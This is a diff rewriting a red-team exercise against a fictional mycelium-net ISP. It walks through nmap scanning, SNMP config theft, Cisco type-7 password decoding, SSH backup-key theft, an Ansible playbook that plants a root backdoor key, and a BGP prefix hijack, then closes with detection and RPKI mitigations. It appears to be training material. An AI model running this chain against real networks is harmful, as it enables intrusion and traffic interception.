@@ -1,173 +1,110 @@
 # Operation Toadstool Takeover
 
-Welcome, aspiring digital miscreant, to the whimsical yet vulnerable world
-of [FungusFiber Internet](entity.md), [Fungolia](../fungolia.md)’s premier (and only)
-provider of mycelium-net-based broadband. Your mission, should you choose to accept it, is to infiltrate their
-chaotically charming network. You will chain together a series of exploits, from lowly default passwords to the majestic
-manipulation of internet routing itself.
+Operation Toadstool Takeover is the loud cousin of the routing exercises against [FungusFiber
+Internet](entity.md), [Fungolia](../fungolia.md)'s only mycelium-net broadband provider. It chains ordinary
+failures, a default community string, a weakly encrypted password, a borrowed backup key, an over-trusted
+automation tool, into control of the core, and from there into the routing itself. Nothing exotic is needed;
+the registry's own neglect supplies every step.
 
-Remember: this is a pantomime. The crown jewels are made of plastic, the customers are all actors, and the entire
-performance is on a closed stage. Your goal is to learn the script of a sophisticated adversary so you can eventually
-direct the defence.
+The hand is Shadow6, the Borogravian regency's cyber wing, the same that runs Blight and Mycelium. Where those
+are patient, Toadstool is direct: get into FungusFiber's boxes, become the core, and announce from it.
 
-The attack surfaces involved are modelled in [Rootways: BGP](../../in/network/roots/bgp/index.rst) and [Patches: BGP](../../in/network/patches/bgp.md). Operational procedures for each stage are in [Tradecraft: network reconnaissance](../../in/network/runbooks/network-recon.md), [Tradecraft: lateral movement](../../in/network/runbooks/lateral-movement.md), and [Tradecraft: BGP routing](../../in/network/runbooks/bgp-routing.md).
+## Getting in
 
-## Stage 1: The Spore Scan - Reconnaissance
+FungusFiber's perimeter gives itself away to a quiet sweep. Shadow6 maps the live edges of the public range,
 
-Goal: To map the digital terrain of FungusFiber and identify every unlocked door and open window.
+```
+nmap -sS -T4 -Pn 10.0.0.0/24 -oG initial_scan.gnmap
+```
 
-Your Actions:
+and a service probe of whatever answers too broadly names the software and its age:
 
-1. The Broad Sweep: Use a tool like `nmap` to perform a silent sweep of the lab's "public" IP range.
-    * Command: `nmap -sS -T4 -Pn 10.0.0.0/24 -oG initial_scan.gnmap`
-    * Look For: Devices with a surprising number of open ports. A printer does not typically listen on 50 different services.
+```
+nmap -sV -sC -O -p <open_ports> <target_ip>
+```
 
-2. Service Interrogation: Interrogate any discovered services to find out what they are and what version they are
-   running.
-    * Command: `nmap -sV -sC -O -p <open_ports> <target_ip>`
-    * Finding: Note any amusingly outdated software. Is the router really running `OpenSSH 4.3` from 2006? Jot it down.
+The core router turns out to be on a years-old build, and an SNMP check finds the management protocol not only
+answering but answering to a read-write community string, `fungus`:
 
-3. The Search for Secrets: Probe for common information leaks.
-    * Command: `snmp-check <target_ip> -c public`
-    * Finding: The SNMP service on the core router is using the read-write community string `fungus`. This is your first
-      key.
+```
+snmp-check <target_ip> -c public
+```
 
-Adversary Mindset: You are a digital truffle pig, sniffing for the valuable, hidden flaws everyone else overlooks.
-Patience is a virtue; a full scan is less suspicious than a frantic, noisy one.
+That string is the first key, and it is enough to make the router hand over its configuration. On an older
+Cisco-style device a config download triggers over SNMP and the router TFTPs the file out
+(`snmpwalk -v2c -c fungus <router_ip> .1.3.6.1.4.1.9.9.96.1.1.1.1.2`), and the file carries a secret stored as
+Cisco type 7, which is obfuscation rather than encryption and reverses in seconds. A search through it,
+`grep -i password router-config.cfg`, returns `enable password 7 0822455D0A165B1E1F`; decoded it reads
+`FungusFan99!`, and it opens an SSH session to the core. Defaults and reversible encoding do most of the work,
+and the perimeter was never really locked.
 
-## Stage 2: The Mycelial Foothold - Initial Access
+## Becoming the core
 
-Goal: To transition from an outside observer to an inside user with a command prompt.
+From the router the internal shape comes into view, `show ip route` for the known networks and
+`show cdp neighbors` for the directly connected devices, and among them a management server at `192.168.5.10`.
+The router holds an SSH key for automated backups to it (`show run | include ssh`), and the matching private
+key lifts off the filesystem and opens the server. A check of what that account may run as root,
 
-Your Actions:
+```
+sudo -l
+```
 
-1. SNMP Exploitation: Use the discovered community string to extract the router's configuration file.
-    * Command: `snmpwalk -v2c -c fungus <router_ip> .1.3.6.1.4.1.9.9.96.1.1.1.1.2` (This is a common OID for triggering
-      config downloads on older Cisco devices in labs).
-    * Finding: The command forces the router to TFTP its config to your machine. You now have the file
-      `router-config.cfg`.
+shows `backup-user` permitted to run `/usr/bin/ansible-playbook` as root without a password. That is the
+lever. A short playbook, run as root, installs a key for the root account:
 
-2. Crack the Code: Open the configuration file. Search for lines containing the word "password". You will find an entry:
-   `enable password 7 0822455D0A165B1E1F`.
-    * Command: `cat router-config.cfg | grep -i password`
-    * Action: Use a Cisco password decoder (like `cisco-decrypt.py`) on the hash.
-    * Finding: The password decrypts to `FungusFan99!`.
+```yaml
+- hosts: localhost
+  become: yes
+  tasks:
+    - name: install backdoor key
+      ansible.builtin.lineinfile:
+        path: /root/.ssh/authorized_keys
+        line: "ssh-rsa AAAAB3NzaC1yc2E... shadow6@lab"
+        create: yes
+        mode: '0600'
+```
 
-3. Establish Access: Use the decrypted password to log into the router via SSH.
-    * Command: `ssh admin@<router_ip>`
-    * Password: `FungusFan99!`
-    * Verification: Your command prompt changes to `FungusFiber-Core-Router#`.
+Root follows, and the management server is owned. Each step is the abuse of a convenience, a backup key, a
+sanctioned automation tool, rather than an exploit, which is what keeps the climb quiet: it reads as
+administration, because it is administration pointed sideways. Shadow6 leaves a key on the core router's admin
+account as well, so a lost foothold elsewhere does not cost the position.
 
-Adversary Mindset: Defaults and weak encryption are the gifts that keep on giving. Never assume a password is truly
-hidden.
+## Becoming the network
 
-## Stage 3: Becoming the Mycelium - Privilege Escalation & Pivot
+Control of the core is control of the routing. From FungusFiber's own AS64500, Shadow6 originates a route for a
+block it does not hold. Origination on a Cisco-style router needs the prefix in the table before the `network`
+statement will advertise it, so a static route brings it into the RIB:
 
-Goal: To move from controlling one router to understanding and controlling the entire network core.
+```
+ip route 198.51.100.0 255.255.255.0 Null0
 
-Your Actions:
+router bgp 64500
+ address-family ipv4 unicast
+  network 198.51.100.0 mask 255.255.255.0
+```
 
-1. Network Topology Discovery: From your new privileged position, map the entire internal network.
-    * Command: `show ip route` (to see all known networks)
-    * Command: `show cdp neighbors` (to find directly connected network devices)
-    * Finding: You discover a server on the internal management network: `192.168.5.10`.
+The `Null0` next hop discards the captured range, which blackholes it; a static route pointed at a capture host
+instead forwards the traffic on after it is read. A more-specific, a `198.51.100.0/25` carved from a covering
+`/24` held elsewhere, wins its range outright by longest-prefix match, regardless of path or policy, and from
+BGP's side the UPDATE is unremarkable. What decides how far it travels is coverage: an unsigned block reads
+`not-found` and propagates almost everywhere, while a ROA naming the real origin makes the forged announcement
+`invalid` and an enforcing neighbour drops it at that hop. The advertisement is confirmed leaving the box and
+its spread read from the public collectors,
 
-2. The Pivot Point: You notice the router has an SSH key configured for automated backups to that server.
-    * Command: `show run | include ssh`
-    * Finding: A line shows: `ip ssh pubkey-chain / username backup-user / key-hash ssh-rsa 0A1B2C3D4E5F...`.
+```
+show ip bgp 198.51.100.0/24
+show ip bgp neighbors <neighbor_ip> advertised-routes
+```
 
-3. Key Theft: Extract the private key corresponding to this public key from the router's filesystem (simulated in the
-   lab by a file placed in `/tmp/`).
-    * Command: `more /tmp/backup-key.priv`
-    * Action: Copy this key to your attacker machine.
+and the captured traffic arrives at the position chosen for it (`tcpdump -nni eth0 net 198.51.100.0/24`).
+Controlling routing is the deepest persistence FungusFiber has to offer: not a door held open, but a hand on
+where the frontier's packets go.
 
-Adversary Mindset: Lateral movement is often about abusing trusted relationships set up for convenience. Automation
-scripts and backup systems are a golden ticket.
+## Switching hats
 
-## Stage 4: Sporing the Core - Lateral Movement
-
-Goal: Use your stolen credentials to infiltrate the management server.
-
-Your Actions:
-
-1. Access the Server: Use the stolen SSH key to access the management server.
-    * Command: `ssh -i backup-key.priv backup-user@192.168.5.10`
-    * Verification: You are in. Your prompt is now `backup-user@mgmt-server:~$`.
-
-2. Explore Your New Kingdom: Check what privileges this user has.
-    * Command: `sudo -l`
-    * Finding: The user can run `/usr/bin/ansible-playbook` as root without a password to run playbooks from
-      `/opt/automation/`.
-
-Adversary Mindset: Always check `sudo -l`. It is the single most common command that leads to privilege escalation on
-Linux systems.
-
-## Stage 5: The Grand Fruiting Body - Privilege Escalation
-
-Goal: To achieve total control by becoming the root user on the management server.
-
-Your Actions:
-
-1. Weaponise Ansible: You can run Ansible playbooks as root. Create a malicious playbook that adds your public SSH key
-   to the root user's `authorized_keys` file.
-    * Create a file called `pwn.yml` in `/tmp/`:
-      ```yaml
-      - hosts: localhost
-        become: yes
-        tasks:
-          - name: Install backdoor key
-            ansible.builtin.lineinfile:
-              path: /root/.ssh/authorized_keys
-              line: "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali"
-              create: yes
-              mode: '0600'
-      ```
-    * Run the playbook as root:
-        * Command: `sudo /usr/bin/ansible-playbook /tmp/pwn.yml`
-
-2. Claim Your Prize: SSH into the management server as the root user.
-    * Command: `ssh -i id_rsa root@192.168.5.10`
-    * Verification: Your prompt is now `root@mgmt-server:~#`. You own the core management server.
-
-Adversary Mindset: Abusing legitimate system administration tools is the ultimate stealth technique. It blends in
-perfectly with normal activity.
-
-## Stage 6: Becoming the Network - Persistence & BGP Manipulation
-
-Goal: To embed yourself deeply and manipulate the very fabric of FungusFiber's internet.
-
-Your Actions:
-
-1. Establish Persistence: Add your SSH key to the `authorized_keys` file of the core router's admin user as well.
-2. BGP Hijacking (Lab Edition): From the router, announce a fictitious network to the rest of the lab.
-    * Command on Router:
-      ```bash
-      configure terminal
-      router bgp 65001
-      network 198.51.100.0 mask 255.255.255.0
-      end
-      ```
-    * Impact: You have now falsely told the entire lab network that you are the legitimate path for this block of IP
-      addresses. Any traffic destined for them will be routed to you.
-
-3. Capture the Traffic: On your attacker machine, use `tcpdump` to watch the traffic for this fake network flow in.
-    * Command: `sudo tcpdump -nni eth0 net 198.51.100.0/24`
-    * Observation: You will see lab test traffic (pings, scans) arriving at your interface.
-
-Adversary Mindset: Persistence is not just about access; it is about power. Controlling routing is the ultimate power in
-an ISP.
-
-## The Aftermath: Switching Hats
-
-Your role as the adversary is now complete. Switch your hat from red to blue.
-
-* Review: Where could FungusFiber have detected the intrusion? (SNMP authentication logs, failed login alerts, unauthorised config changes, anomalous BGP advertisements).
-* Mitigate: How could each step have been prevented?
-    * Stage 1: Filter SNMP at the perimeter; use complex community strings.
-    * Stage 2: Use SNMPv3 with encryption; never use weak password encryption.
-    * Stage 3 & 4: Protect SSH keys; implement network segmentation; follow the principle of least privilege with
-      `sudo`.
-    * Stage 6: Implement BGP Origin Validation (RPKI) and filter prefixes.
-
-You have now walked in the footsteps of an advanced adversary. Use this knowledge to build stronger defences. The
-internet's fungi depend on it
+Each step leaves a mark a defender can read: the SNMP read-write string and the config download at the edge,
+the unexpected key use between boxes, the root-level Ansible run, and the anomalous BGP advertisement at the
+end. The routing stage in particular yields to the inter-domain controls, origin validation that drops
+`invalid`, tight prefix filters, and a ROA with a max length that leaves no more-specific to carve. The
+defender's-side reconstruction is in the blue notes on
+[inter-domain routing](https://blue.tymyrddin.dev/docs/counter/inter-domain/).
